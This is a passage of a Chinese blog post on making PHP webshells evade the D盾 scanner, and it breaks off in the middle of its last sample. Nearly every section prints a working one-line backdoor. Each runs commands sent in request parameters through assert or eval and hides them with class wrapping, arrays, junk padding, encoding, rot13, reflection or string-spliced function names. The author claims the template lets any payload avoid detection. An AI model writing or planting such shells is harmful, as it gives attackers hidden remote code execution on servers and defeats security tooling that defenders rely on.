+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430716-cd6e8407-7c48-40d6-869e-13183f1b2798.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>我们发现只要满足xxx(xxxx)这种格式D盾都会报一级。</p>
+<p>从自己这么长时间跟D盾的斗争经验来说，1级变量函数不太容易过</p>
+<p>这里直接给大家分享一些自己总结的免杀方法。</p>
+<h3 id="类调用" class="headerLink">
+    <a href="#%e7%b1%bb%e8%b0%83%e7%94%a8" class="header-mark"></a>4.2 类调用</h3><p>自己在<code>webshell-venom</code>里面一直用的类调用的方式绕过D盾</p>
+<p>下面是webshell-venom-3.3生成的shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class KBFI{
+</span></span><span class="line"><span class="cl">    function __destruct(){
+</span></span><span class="line"><span class="cl">        $XMKD=&#39;B:YVD%&#39;^&#34;\x23\x49\x2a\x33\x36\x51&#34;;
+</span></span><span class="line"><span class="cl">        return @$XMKD(&#34;$this-&gt;RUOK&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$kbfi=new KBFI();
+</span></span><span class="line"><span class="cl">@$kbfi-&gt;RUOK=isset($_GET[&#39;id&#39;])?base64_decode($_POST[&#39;mr6&#39;]):$_POST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430807-ec34a43b-2046-47e7-8b67-fb79c0e513c8.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>惊了，这么长时间D盾还不杀。。。</p>
+<p>因为实际操作中发现D盾对类变量不是很敏感，把混淆的内容都放到类里，就可以比较轻易地绕过D盾。</p>
+<p>那么我们如何对上一部分的shell修改让他消除1级呢</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class KBFI{
+</span></span><span class="line"><span class="cl">    function __destruct(){
+</span></span><span class="line"><span class="cl">        $XMKD=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">        return @$XMKD(&#34;$this-&gt;RUOK&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$kbfi=new KBFI();
+</span></span><span class="line"><span class="cl">@$kbfi-&gt;RUOK=isset($_GET[&#39;id&#39;])?base64_decode($_POST[&#39;mr6&#39;]):$_POST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900430936-da99ae78-5d27-4ba4-ab09-28b6a55a82e5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>会发现我们就算改了$XMKD变量后D盾也无法识别。</p>
+<p>也就是说只要按照这个模板写出来的shell，任意修改payload都可以免杀。</p>
+<p>这也就是为什么3.3版本可以支持任意文件免杀</p>
+<p>不过要注意的是assert只能执行一句，必须配合eval才可以执行多句。</p>
+<p>具体看3.3的更新日志，不再赘述。</p>
+<p><a href="https://yzddmr6.tk/posts/webshell-venom-3-3/" target="_blank" rel="noopener noreferrer">https://yzddmr6.tk/posts/webshell-venom-3-3/</a></p>
+<p>我们已经知道了通过类的方式可以很容易的免杀D盾</p>
+<p>所以换个写法，把传参部分写到类里也可以绕过。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">class T{
+</span></span><span class="line"><span class="cl">	public $t;
+</span></span><span class="line"><span class="cl">	function test(){
+</span></span><span class="line"><span class="cl">	$this-&gt;t=@$_REQUEST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">	$k = urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">	return $k;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$test=new T();
+</span></span><span class="line"><span class="cl">$a=$test-&gt;test();
+</span></span><span class="line"><span class="cl">@$a($test-&gt;t);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431058-6815cafb-c3d0-4436-985b-f3a6d666eead.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="数组包裹" class="headerLink">
+    <a href="#%e6%95%b0%e7%bb%84%e5%8c%85%e8%a3%b9" class="header-mark"></a>4.3 数组包裹</h3><p>这是星球嘉宾九世写的一个shell，我在星球里也发过他的解析。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function demo($name,$value){
+</span></span><span class="line"><span class="cl">    [$name ($value)];
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$v=$_GET[&#39;a&#39;];
+</span></span><span class="line"><span class="cl">$file=file_get_contents(__FILE__);
+</span></span><span class="line"><span class="cl">preg_match(&#34;/assert/&#34;,$file,$mc);
+</span></span><span class="line"><span class="cl">preg_match(&#34;/GET/&#34;,$file,$cs);
+</span></span><span class="line"><span class="cl">$cx=&#39;_&#39;.$cs[0];
+</span></span><span class="line"><span class="cl">demo($mc[0],${$cx}[&#39;a&#39;])
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原型就是<code>assert($_GET['a']);</code></p>
+<p>demo函数是主要的执行函数</p>
+<p>这里的$name就是要传入的assert</p>
+<p>valueæ¯<code>_GET['a']</code></p>
+<p>其他的代码都是用来混淆这两个参数的</p>
+<p>首先$file获取自身文件的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_match(&#34;/assert/&#34;,$file,$mc);//把匹配到的assert字符串放到$mc数组里,其中第0号元素就是字符串“assert”
+</span></span><span class="line"><span class="cl">preg_match(&#34;/GET/&#34;,$file,$cs); //同理,放到了$cs[0]中
+</span></span><span class="line"><span class="cl">$cx=&#39;_&#39;.$cs[0];//拼接成_GET
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后调用demo函数传入参数执行。</p>
+<p>发现D盾对于外部<code>$a($b)</code>这种格式比较敏感，但是对于<code>[$a($b)]</code>这种就不能识别了。</p>
+<p>所以我们只需要将<code>$a($b)</code>包裹进数组里即可绕过</p>
+<p>所以按照这个套路我们可以怎么改呢</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function demo($name,$value){
+</span></span><span class="line"><span class="cl">    [$name($value)];
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">demo(urldecode(&#39;%61%73%73%65%72%74&#39;),$_POST[&#39;mr6&#39;]);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431269-62a78b32-4d45-449b-979a-bb7def31be70.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="垃圾代码填充" class="headerLink">
+    <a href="#%e5%9e%83%e5%9c%be%e4%bb%a3%e7%a0%81%e5%a1%ab%e5%85%85" class="header-mark"></a>4.4 垃圾代码填充</h3><p>举个例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">$b=urldecode(&#34;%5f%47%45%54&#34;);
+</span></span><span class="line"><span class="cl">$c=${$b}[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">$a($c);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431386-3e9ac496-cb40-4f44-bd42-b7ef6d8d32e1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>填充垃圾代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$index = &#39;index.html&#39;;
+</span></span><span class="line"><span class="cl">$a=urldecode(&#39;%61%73%73%65%72%74&#39;);
+</span></span><span class="line"><span class="cl">$b=urldecode(&#34;%5f%47%45%54&#34;);
+</span></span><span class="line"><span class="cl">$c=${$b}[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">$a($c);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900431506-d8759c29-7017-4ef7-9a16-792b15311e08.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>玄学</p>
+<h3 id="pop链" class="headerLink">
+    <a href="#pop%e9%93%be" class="header-mark"></a>4.5 POP链</h3><p>这是以后webshell-venom的方向。</p>
+<p>之前以上所做的一切混淆编码都是人为的留后门，为了留后门而留后门，很容易被发现。</p>
+<p>然而POP相当于程序的漏洞，可以看作是人造漏洞，难以被检测出。</p>
+<p>可以写一个脚本来循环生成，自动拼接，自动生成payload。</p>
+<p>项目还在规划中，有兴趣的同学可以一起研究一下。</p>
+<h3 id="补充实例" class="headerLink">
+    <a href="#%e8%a1%a5%e5%85%85%e5%ae%9e%e4%be%8b" class="header-mark"></a>4.6 补充实例</h3><p>放一些星球里的例子吧，都是免杀的图就不重复贴了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">class T{
+</span></span><span class="line"><span class="cl">    public $t;
+</span></span><span class="line"><span class="cl">    function test(){
+</span></span><span class="line"><span class="cl">    $this-&gt;t=@$_REQUEST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">    $k = urldecode(&#34;%73%73%65%72%74&#34;);
+</span></span><span class="line"><span class="cl">    $a = &#39;a&#39;.$k;
+</span></span><span class="line"><span class="cl">    return $a;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$test=new T();
+</span></span><span class="line"><span class="cl">$a=$test-&gt;test();
+</span></span><span class="line"><span class="cl">@$a($test-&gt;t);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>转义号绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function Test(){
+</span></span><span class="line"><span class="cl">    $c=[$x=&#39;a&#39;,$x.=&#39;s&#39;,$x.=&#39;s&#39;,$x.=&#39;e&#39;,$x.=&#39;r&#39;,$x.=&#39;t&#39;];
+</span></span><span class="line"><span class="cl">    $c=$_REQUEST[&#39;a&#39;];
+</span></span><span class="line"><span class="cl">    return [$x(&#34;\\$c&#34;)];
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">Test();
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>类继承绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class get{
+</span></span><span class="line"><span class="cl">    public function setName($name){
+</span></span><span class="line"><span class="cl">        return $this -&gt; name = $name;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">class getshell extends get{
+</span></span><span class="line"><span class="cl">    public $name = &#34;ass&#34;;
+</span></span><span class="line"><span class="cl">    public $name2 = &#34;ert&#34;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$shell = new getshell();
+</span></span><span class="line"><span class="cl">$gshell = $shell -&gt; name;
+</span></span><span class="line"><span class="cl">$gshell2 = $shell -&gt; name2;
+</span></span><span class="line"><span class="cl">$b = $shell -&gt; setName(&#34;$_POST[1]&#34;);
+</span></span><span class="line"><span class="cl">$s = $gshell.$gshell2;
+</span></span><span class="line"><span class="cl">$s($b);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>类反射绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">    class aassert{
+</span></span><span class="line"><span class="cl">        public $s;  
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    $a=new ReflectionClass(&#39;aassert&#39;);
+</span></span><span class="line"><span class="cl">    @$a-&gt;s=$_POST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">    $b=substr((string)$a-&gt;getName(),1);
+</span></span><span class="line"><span class="cl">   @$b($a-&gt;s);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>极简一句话</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$data=str_rot13(&#34;nffreg&#34;);
+</span></span><span class="line"><span class="cl">$n=[$data,$_GET[&#39;a&#39;]];
+</span></span><span class="line"><span class="cl">[&#34;&#34;=&gt;$n[0]($n[1])];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>极简一句话2</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$_=[$_GET[&#39;a&#39;]];
+</span></span><span class="line"><span class="cl">[eval(&#34;//愚蠢的凡人\n&#34;.$_[0])];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>不一样的匿名函数写法</strong></p>
+<p>参考链接：<a href="https:_codeday.me_bug_20181026_327968" rel="">https://codeday.me/bug/20181026/327968.html</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$upper=function (){
+</span></span><span class="line"><span class="cl">    if(isset($_GET[&#39;a&#39;])) {
+</span></span><span class="line"><span class="cl">        $_=[$_GET[&#39;a&#39;],$_GET[&#39;b&#39;]];
+</span></span><span class="line"><span class="cl">        $__=array([$_[0]])[0][0];
+</span></span><span class="line"><span class="cl">        $___=array([$_[1]])[0][0];
+</span></span><span class="line"><span class="cl">        [$__($___)];
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl">echo [$upper()];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**仙法<em>数组过D盾</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">搞的过程发现多维数组和数组的下标不一样可以使D盾报一级
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$_=array([[[&#34;你真的很多BUG耶&#34;,$_GET[&#39;a&#39;]]]]);
+</span></span><span class="line"><span class="cl">eval($_[0][0][0][1]);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>卢本伟绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$_=&#34;17张牌你+t+能秒我+t+ 你能秒杀我，你+n+今天能十c七张牌把t卢本伟秒了，我i当+o+场就把这个电脑屏幕吃掉+c+。__&#34;;
+</span></span><span class="line"><span class="cl">$__=&#34;我+f+真他吗没+r+开挂__&#34;;
+</span></span><span class="line"><span class="cl">$___=&#39;现+a+在麻烦直播间的所+n+有人给我站起来+e+_&#39;;
+</span></span><span class="line"><span class="cl">$____=$_.$__.$___;
+</span></span><span class="line"><span class="cl">$_____=explode(&#34;+&#34;,$____);
+</span></span><span class="line"><span class="cl">$______=[$_____[9].$_____[13],$_____[19].$_____[15],$_____[1].$_____[19],$_____[20].$_____[11],&#39;un&#39;.&#39;cti&#39;,&#39;o&#39;.&#39;n&#39;,$_GET[&#39;_&#39;]];
+</span></span><span class="line"><span class="cl">$_______=array($______[0].$______[1],$______[2].$______[3],$______[4].$______[5]);
+</span></span><span class="line"><span class="cl">$________=array($_______[0].$_______[1].$_______[2]);
+</span></span><span class="line"><span class="cl">$_________=$________[0](&#39;$a&#39;,$______[6]);
+</span></span><span class="line"><span class="cl">$_________(&#39;phpifno();&#39;);
